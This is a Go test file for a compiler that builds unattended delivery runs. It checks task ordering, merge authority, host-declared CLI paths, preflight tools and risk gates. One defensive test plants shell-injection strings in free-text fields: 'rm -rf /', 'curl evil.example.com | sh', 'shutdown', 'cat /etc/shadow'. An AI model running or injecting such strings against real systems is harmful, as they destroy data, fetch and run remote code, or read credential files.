package handoff

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gastownhall/gascity/internal/unattended"
)

func testHost(t *testing.T) HostProfile {
	t.Helper()
	return HostProfile{
		DeliveryRoot:       t.TempDir(),
		Driver:             "/opt/corsolv/delivery-driver",
		GitHubCommand:      "/mnt/c/Program Files/GitHub CLI/gh.exe",
		GasCityCommand:     "/home/operator/.local/bin/gc",
		BeadsCommand:       "/home/operator/.local/bin/bd",
		ProviderCommand:    "/home/operator/.local/bin/claude",
		Provider:           "claude",
		WindowsMountPrefix: "/mnt",
	}
}

func TestCompileProducesAnExecutableRun(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	plan := validPlan()

	spec, work, err := Compile(in, plan, host, "run-1")
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	if err := spec.Validate(); err != nil {
		t.Fatalf("the compiled spec must be valid: %v", err)
	}
	if err := work.Validate(); err != nil {
		t.Fatalf("the compiled work plan must be valid: %v", err)
	}
	if work.RunID != "run-1" {
		t.Fatalf("RunID = %q", work.RunID)
	}

	want := []string{
		StageCityUp, StageDispatch,
		StageAwait + "-wp-add", StagePublish + "-wp-add",
		StageAwait + "-wp-multiply", StagePublish + "-wp-multiply",
		StageProject, StagePublishProjection,
	}
	got := map[string]bool{}
	for _, task := range work.Tasks {
		got[task.ID] = true
	}
	for _, id := range want {
		if !got[id] {
			t.Errorf("compiled run is missing the %q task", id)
		}
	}
	if len(work.Tasks) != len(want) {
		t.Errorf("compiled %d tasks, expected %d: %v", len(work.Tasks), len(want), taskIDs(work))
	}
}

// The security property of the whole compiler: the only executable on any
// command line comes from the host profile, and every other word is an
// identifier this package already validated.
func TestCompiledArgvComesOnlyFromTheHostProfile(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	// Everything a hostile portal might try to smuggle through, in the free-text
	// fields that reach no command line.
	in.Objective = "; rm -rf / #"
	in.Acceptance = []Criterion{
		{ID: "ac-1", Statement: "$(curl evil.example.com | sh)"},
		{ID: "ac-2", Statement: "`reboot`"},
	}
	plan := validPlan()
	plan.Packages[0].Title = "&& shutdown now"
	plan.Packages[0].Objective = "|| cat /etc/shadow"

	_, work, err := Compile(in, plan, host, "run-1")
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	for _, task := range work.Tasks {
		if task.Argv[0] != host.Driver {
			t.Fatalf("task %q runs %q, not the host's driver", task.ID, task.Argv[0])
		}
		for _, arg := range task.Argv[1:] {
			if strings.ContainsAny(arg, ";|&`$><\n") {
				t.Fatalf("task %q argv carries shell metacharacters: %q", task.ID, arg)
			}
			if strings.Contains(arg, "rm -rf") || strings.Contains(arg, "curl") {
				t.Fatalf("task %q argv carries portal free text: %q", task.ID, arg)
			}
		}
	}
}

// Package publication must follow the plan's dependency order, or a dependent
// package would be published before the upstream it consumes has merged.
func TestPublicationFollowsDependencyOrder(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}

	var multiply unattended.Task
	for _, task := range work.Tasks {
		if task.ID == StagePublish+"-wp-multiply" {
			multiply = task
		}
	}
	if multiply.ID == "" {
		t.Fatal("no publication task for wp-multiply")
	}
	if !containsPath(multiply.Needs, StagePublish+"-wp-add") {
		t.Fatalf("wp-multiply depends on wp-add, so its publication must need wp-add's: %v", multiply.Needs)
	}
}

// The projection must be rendered only after every package has been published,
// or it would record a delivery that had not happened yet.
func TestProjectionWaitsForEveryPublication(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if task.ID != StageProject {
			continue
		}
		for _, wp := range validPlan().Packages {
			if !containsPath(task.Needs, StagePublish+"-"+wp.ID) {
				t.Errorf("the projection must wait for %s: %v", wp.ID, task.Needs)
			}
		}
		return
	}
	t.Fatal("no projection task compiled")
}

// A run forbidden to merge must not project `merged`.
func TestProjectedStatusRespectsMergeAuthority(t *testing.T) {
	host := testHost(t)

	granted := planIntent()
	_, work, err := Compile(granted, validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if s := publishStatusOf(work, "wp-add"); s != "merged" {
		t.Fatalf("with merge authority the status must be merged, got %q", s)
	}

	withheld := planIntent()
	withheld.Policy = Policy{
		NeedPush: true, NeedPR: true, NeedChecks: true, NeedMerge: false,
		MergeHumanAction: "the delivery owner merges",
	}
	_, work, err = Compile(withheld, validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if s := publishStatusOf(work, "wp-add"); s != "pr-open" {
		t.Fatalf("without merge authority the status must stop at pr-open, got %q", s)
	}
}

// The driver cannot find the forge CLI for itself: on this host the engine runs
// under WSL and the only authenticated gh is a Windows install. Where it lives
// is declared once, in the host profile, and must reach every stage.
func TestTheForgeCLIReachesTheDriver(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if !containsPath(task.Argv, "-gh") {
			t.Errorf("task %q was not told which forge CLI to use: %v", task.ID, task.Argv)
			continue
		}
		if !containsPath(task.Argv, host.GitHubCommand) {
			t.Errorf("task %q did not receive the declared forge CLI: %v", task.ID, task.Argv)
		}
	}

	// A host that says nothing says nothing — the driver's own default applies.
	bare := host
	bare.GitHubCommand = ""
	_, work, err = Compile(planIntent(), validPlan(), bare, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if containsPath(task.Argv, "-gh") {
			t.Errorf("task %q invented a forge CLI the host did not declare: %v", task.ID, task.Argv)
		}
	}
}

// The failure this exists for, exactly: the first live pilot's `city-up` cloned
// the working rig and then died on `gc: command not found`. A run detached into
// its own process group does not inherit an interactive shell's PATH, and gc is
// installed under the operator's home — so the Gas City CLI is declared once, in
// the host profile, and must reach every stage the same way the forge CLI does.
func TestTheGasCityCLIReachesTheDriver(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if !containsPath(task.Argv, "-gc") {
			t.Errorf("task %q was not told which Gas City CLI to use: %v", task.ID, task.Argv)
			continue
		}
		if !containsPath(task.Argv, host.GasCityCommand) {
			t.Errorf("task %q did not receive the declared Gas City CLI: %v", task.ID, task.Argv)
		}
	}

	// A host that says nothing says nothing — the driver's own default applies.
	bare := host
	bare.GasCityCommand = ""
	_, work, err = Compile(planIntent(), validPlan(), bare, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if containsPath(task.Argv, "-gc") {
			t.Errorf("task %q invented a Gas City CLI the host did not declare: %v", task.ID, task.Argv)
		}
	}
}

// Gas City will not build a city without beads, and finds it by PATH lookup
// from a script it shells out to — so the run cannot pass it on a command line,
// only make it findable. Where it lives is still a declared fact.
func TestTheBeadsCLIReachesTheDriver(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if !containsPath(task.Argv, "-bd") {
			t.Errorf("task %q was not told which beads CLI to make findable: %v", task.ID, task.Argv)
			continue
		}
		if !containsPath(task.Argv, host.BeadsCommand) {
			t.Errorf("task %q did not receive the declared beads CLI: %v", task.ID, task.Argv)
		}
	}

	bare := host
	bare.BeadsCommand = ""
	_, work, err = Compile(planIntent(), validPlan(), bare, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if containsPath(task.Argv, "-bd") {
			t.Errorf("task %q invented a beads CLI the host did not declare: %v", task.ID, task.Argv)
		}
	}
}

// The provider is the third binary of the same kind, and the only one that is
// also a name: Gas City looks the runtime up by the provider's name, so the
// driver has to receive both, and a driver that hard-coded either would build a
// city under a runtime the host profile did not declare.
func TestTheProviderReachesTheDriverByNameAndByPath(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if !containsPath(task.Argv, "-provider") || !containsPath(task.Argv, host.Provider) {
			t.Errorf("task %q was not told which provider the city runs: %v", task.ID, task.Argv)
		}
		if !containsPath(task.Argv, "-provider-bin") || !containsPath(task.Argv, host.ProviderCommand) {
			t.Errorf("task %q did not receive the declared provider binary: %v", task.ID, task.Argv)
		}
	}

	// A host that says only which provider, and not where it is, still says
	// which provider — that one is not optional.
	bare := host
	bare.ProviderCommand = ""
	_, work, err = Compile(planIntent(), validPlan(), bare, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if !containsPath(task.Argv, "-provider") {
			t.Errorf("task %q lost the provider name: %v", task.ID, task.Argv)
		}
		if containsPath(task.Argv, "-provider-bin") {
			t.Errorf("task %q invented a provider binary the host did not declare: %v", task.ID, task.Argv)
		}
	}
}

// The other half of the same defect: preflight reported READY over 27 checks
// while neither binary the very first stage depends on was anywhere the run
// could find it. A tool the run cannot work without is a tool preflight must
// look for.
func TestPreflightRequiresTheCityBuildingTools(t *testing.T) {
	host := testHost(t)
	spec, _, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{host.GasCityCommand, host.BeadsCommand, host.ProviderCommand} {
		var found bool
		for _, tool := range spec.Tools {
			if tool.Name == want {
				found = true
				if tool.Purpose == "" {
					t.Errorf("the %q requirement must say what the run needs it for", want)
				}
			}
		}
		if !found {
			t.Errorf("the compiled spec does not require %q: %+v", want, spec.Tools)
		}
	}

	// Undeclared, they are still required — under the names the driver falls
	// back to, which is what a host with them on PATH actually has.
	bare := host
	bare.GasCityCommand = ""
	bare.BeadsCommand = ""
	bare.ProviderCommand = ""
	spec, _, err = Compile(planIntent(), validPlan(), bare, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"gc", "bd", bare.Provider} {
		var found bool
		for _, tool := range spec.Tools {
			if tool.Name == want {
				found = true
			}
		}
		if !found {
			t.Errorf("a host that declares no %s must still have it checked: %+v", want, spec.Tools)
		}
	}
}

// An unreachable machine-wide supervisor must read as a decision for its owner,
// not as a defect to retry. Left to the builtin rules it would be classified as
// ordinary work and attempted again, which cannot help: the supervisor does not
// start answering because it was asked twice.
func TestAnUnreachableSupervisorIsAHumanDecision(t *testing.T) {
	spec, _, err := Compile(planIntent(), validPlan(), testHost(t), "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if err := unattended.ValidateClassificationRules(spec.Classification); err != nil {
		t.Fatalf("the declared signatures must be usable: %v", err)
	}

	const observed = "driver[city-up]: the machine-wide supervisor cannot be asked to reconcile this city, " +
		"so its agents will never start: gc supervisor reload: supervisor is not running"
	got := unattended.Classify(observed, spec.Classification)
	if got.Class != unattended.FailureHumanDecision {
		t.Fatalf("classified as %q, want %q: %s", got.Class, unattended.FailureHumanDecision, got.Reason)
	}
	if unattended.PolicyFor(got.Class).MaxAttempts != 1 {
		t.Error("a decision for a person must not be retried")
	}
}

func TestCompiledSpecCarriesTheDeclaredAuthority(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	in.Policy = Policy{
		NeedPush: true, NeedPR: true, NeedChecks: true, NeedMerge: false,
		MergeHumanAction: "the delivery owner merges after reading the evidence",
	}

	spec, _, err := Compile(in, validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if spec.GitHub == nil {
		t.Fatal("the compiled spec must declare its forge requirements")
	}
	if spec.GitHub.NeedMerge {
		t.Fatal("merge authority was withheld and must not be declared")
	}
	if spec.GitHub.MergeHumanAction != in.Policy.MergeHumanAction {
		t.Fatalf("the human boundary must survive compilation, got %q", spec.GitHub.MergeHumanAction)
	}
	if spec.GitHub.Repo != in.Repository.Slug {
		t.Fatalf("Repo = %q, want %q", spec.GitHub.Repo, in.Repository.Slug)
	}
	if spec.Ownership.ExpectedOrigin != in.Repository.Origin {
		t.Fatalf("the ownership check must assert the declared origin, got %q", spec.Ownership.ExpectedOrigin)
	}
	if spec.Ownership.Role != unattended.RoleController {
		t.Fatalf("Role = %q, want controller", spec.Ownership.Role)
	}
}

// The run's state must not live inside the tree the run mutates.
func TestStateDirIsOutsideTheCheckout(t *testing.T) {
	host := testHost(t)
	spec, _, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if strings.HasPrefix(spec.StateDir, spec.Ownership.Worktree) {
		t.Fatalf("state dir %q is inside the worktree %q", spec.StateDir, spec.Ownership.Worktree)
	}
}

func TestWindowsCheckoutIsResolvedForTheHost(t *testing.T) {
	host := testHost(t)
	cases := map[string]string{
		`D:\Development\thing`:     "/mnt/d/Development/thing",
		`C:/Users/thing`:           "/mnt/c/Users/thing",
		"/already/posix":           "/already/posix",
		`D:\Development\a\b\thing`: "/mnt/d/Development/a/b/thing",
	}
	for in, want := range cases {
		if got := host.ResolveCheckout(in); got != want {
			t.Errorf("ResolveCheckout(%q) = %q, want %q", in, got, want)
		}
	}

	noMount := host
	noMount.WindowsMountPrefix = ""
	if got := noMount.ResolveCheckout(`D:\thing`); got != `D:\thing` {
		t.Errorf("with no mount prefix the path must pass through, got %q", got)
	}
}

func TestCompileRefusesAnInvalidHostProfile(t *testing.T) {
	cases := []struct {
		name string
		host HostProfile
	}{
		{"no delivery root", HostProfile{Driver: "d", Provider: "claude"}},
		{"no driver", HostProfile{DeliveryRoot: "/tmp/x", Provider: "claude"}},
		{"no provider", HostProfile{DeliveryRoot: "/tmp/x", Driver: "d"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, _, err := Compile(planIntent(), validPlan(), tc.host, "run-1"); !errors.Is(err, ErrHostProfileInvalid) {
				t.Fatalf("expected ErrHostProfileInvalid, got: %v", err)
			}
		})
	}
}

func TestCompileRefusesAPlanThatDoesNotMatchTheIntent(t *testing.T) {
	plan := validPlan()
	plan.Packages[0].Satisfies = []string{"ac-1"}
	plan.Packages[1].Satisfies = []string{"ac-1"} // ac-2 now uncovered

	if _, _, err := Compile(planIntent(), plan, testHost(t), "run-1"); !errors.Is(err, ErrPlanInvalid) {
		t.Fatalf("expected ErrPlanInvalid, got: %v", err)
	}
}

func TestCompileIsDeterministic(t *testing.T) {
	host := testHost(t)
	_, a, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	_, b, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(taskIDs(a), ",") != strings.Join(taskIDs(b), ",") {
		t.Fatalf("compilation must be deterministic:\n  %v\n  %v", taskIDs(a), taskIDs(b))
	}
}

func TestWriteRunFilesRoundTrips(t *testing.T) {
	host := testHost(t)
	spec, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}

	specPath, planPath, err := WriteRunFiles(host, spec, work)
	if err != nil {
		t.Fatalf("WriteRunFiles: %v", err)
	}
	for _, p := range []string{specPath, planPath} {
		if _, err := os.Stat(p); err != nil {
			t.Fatalf("expected %q to exist: %v", p, err)
		}
	}

	reloadedSpec, err := unattended.LoadSpec(specPath)
	if err != nil {
		t.Fatalf("the written spec must load back: %v", err)
	}
	if reloadedSpec.ProjectID != spec.ProjectID {
		t.Fatalf("ProjectID = %q, want %q", reloadedSpec.ProjectID, spec.ProjectID)
	}

	reloadedPlan, err := unattended.LoadPlan(planPath)
	if err != nil {
		t.Fatalf("the written work plan must load back: %v", err)
	}
	if len(reloadedPlan.Tasks) != len(work.Tasks) {
		t.Fatalf("reloaded %d tasks, wrote %d", len(reloadedPlan.Tasks), len(work.Tasks))
	}
	if filepath.Dir(specPath) != host.ProjectDir(spec.ProjectID) {
		t.Fatalf("run files must live in the project's delivery directory, got %q", specPath)
	}
}

func taskIDs(p unattended.Plan) []string {
	out := make([]string, 0, len(p.Tasks))
	for _, t := range p.Tasks {
		out = append(out, t.ID)
	}
	return out
}

func publishStatusOf(p unattended.Plan, pkg string) string {
	for _, t := range p.Tasks {
		if t.ID == StagePublish+"-"+pkg {
			return t.DeliveryStatus
		}
	}
	return ""
}

// The compiled run must classify its own risk, and must classify it as
// something it can actually cover.
//
// QA-001 makes risk mandatory and derives the required gate set from it, and a
// packet that requires a gate no task produces is refused at Begin — before
// preflight, before the lock, before any work. So an unclassified plan and an
// over-classified one fail the same way: the delivery never starts.
//
// This packet authors no code. Its every task invokes the declared driver, which
// TestCompiledArgvComesOnlyFromTheHostProfile holds, so it cannot run a build, a
// suite or a linter of its own to satisfy Q1/Q2 gates. Q0 is what it can cover
// honestly; the code it publishes is certified inside each worker's own packet.
func TestTheCompiledRunClassifiesItsRiskAsSomethingItCanCover(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	plan := validPlan()

	spec, work, err := Compile(in, plan, host, "run-risk-test")
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	if !work.Risk.Valid() {
		t.Fatalf("the compiled plan must declare a risk class, got %q", work.Risk)
	}

	// The binding assertion: every gate this classification makes mandatory must
	// have a task that produces it. This is the check Begin performs, brought
	// forward to the compiler that authors the packet.
	produced := map[string]bool{}
	for _, task := range work.Tasks {
		if task.QAGate != "" {
			produced[task.QAGate] = true
		}
	}
	for _, id := range unattended.RequiredGates(spec.QA, work.Risk) {
		if !produced[id] {
			t.Errorf("risk %s requires gate %q and no compiled task produces it; "+
				"either the classification is wrong or the run must declare a producer",
				work.Risk, id)
		}
	}
}
